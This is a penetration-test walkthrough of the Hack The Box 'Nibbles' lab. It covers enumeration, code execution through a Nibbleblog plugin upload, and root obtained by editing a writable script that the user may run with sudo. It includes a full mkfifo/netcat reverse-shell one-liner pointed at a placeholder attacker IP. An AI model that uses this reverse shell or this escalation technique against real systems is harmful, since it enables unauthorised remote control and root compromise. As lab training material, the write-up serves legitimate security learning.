
# 🧠 Nibbles – Penetration Test Walkthrough

---

## 📌 Overview

- **Target:** Linux Machine (Hack The Box)
- **Objective:** Gain root access
- **Methodology:** Enumeration → Exploitation → Privilege Escalation

---

## 🔍 1. Nmap Scan

```
nmap -p- -sVC -T4 <target-ip>
```

**Findings:**
- 22 → SSH
- 80 → HTTP

---

## 🌐 2. Web Enumeration

- Found `/nibbleblog`
- Identified CMS: **Nibbleblog**

---

## 💥 3. Exploitation (File Upload → RCE)

- Logged into admin panel
- Uploaded reverse shell via plugin
- Caught shell:

```
nc -lvnp 8443
```

---

## 🐚 4. Initial Shell

Shell obtained as low-priv user:

```
id
```

---

## 🔎 5. Enumeration

Discovered interesting files:

- `monitor.sh`
- Writable directory: `/home/nibbler/personal/stuff/`

Checked sudo permissions:

```
sudo -l
```

👉 Found:
```
User can run monitor.sh as root
```

---

## 🚀 6. Privilege Escalation (REAL SKILL PART)

### Key Finding:
- `monitor.sh` runs as root
- Script is located in a writable directory

👉 This means:
**We can modify the script to execute our own commands as root**

---

### Injected Reverse Shell into Script

Modified script to include:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 8443 > /tmp/f
```

---

### Executed Script with sudo:

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

---

## 👑 7. Root Access

Listener received connection:

```
nc -lvnp 8443
```

Verified:

```
id
uid=0(root)
```

---

## 🧠 Key Takeaways

- Always check `sudo -l`
- Writable scripts run with sudo = **easy privesc**
- Look for:
  - scripts
  - cron jobs
  - backups
- Reverse shell injection is a powerful technique
- Enumeration AFTER shell is critical

---

## 🔥 Attack Chain Summary

```
Web App → Nibbleblog → File Upload → RCE → Shell →
sudo -l → Writable Script → Inject Reverse Shell → Root
```

---
